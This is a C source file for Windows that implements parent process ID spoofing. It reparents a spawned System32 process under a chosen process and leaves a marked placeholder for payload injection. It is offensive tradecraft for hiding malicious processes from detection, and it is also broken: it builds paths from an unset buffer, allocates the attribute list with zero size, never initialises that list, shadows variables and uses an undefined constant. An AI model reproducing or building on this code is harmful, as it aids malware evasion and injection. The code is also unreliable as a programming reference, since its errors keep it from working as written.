#include <Windows.h>
#include <stdio.h>




// Steps to do the PPID Spoofing
// 1 - Create a Process using  EXTENDED_STARTUPINFO_PRESENT FLAG

// 2 - Creating STARTUPINFOEXA structure which contains LPPROC_THREAD_ATTRIBUTE_LIST

// 3 - Initialize the attribute list using InitializeProcThreadAttributeList.

// 4 - Update the attribute list using UpdateProcThreadAttribute


BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	HANDLE hProcess;
	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];
	CHAR					CurrentDir[MAX_PATH];

	SIZE_T sThreadSize = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList = NULL;

	STARTUPINFOEXA SiEx = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };


	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	sprintf(CurrentDir, "%s\\System32\\", WnDr);


	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	


	// getting the %windir% system variable path (this is 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadSize);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n",GetLastError());
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadSize)) {
		printf("Initializing proc thread attribute list has failed !! error : %d\n",GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("Updating the parent has failed !! error : %d\n", GetLastError());
		return FALSE;

	}
	

	SiEx.lpAttributeList = pThreadAttList;



	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SiEx.StartupInfo, &Pi)) {
		printf("Can't create the process !!!!\n");
		return FALSE;
	}

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	hThread = Pi.hThread;

	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);
	
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) return TRUE;
}



int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("Please enter the parent ID \n");
		return -1;
	}
	DWORD		dwPPid = atoi(argv[1]),
				dwProcessId = NULL;

	HANDLE		hPProcess = NULL,
		hProcess = NULL,
		hThread = NULL;

	// openning a handle to the parent process
	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return -1;
	}


	printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwPPid);
	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);

	/*

		payload injection code here (for example)

	*/


	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}

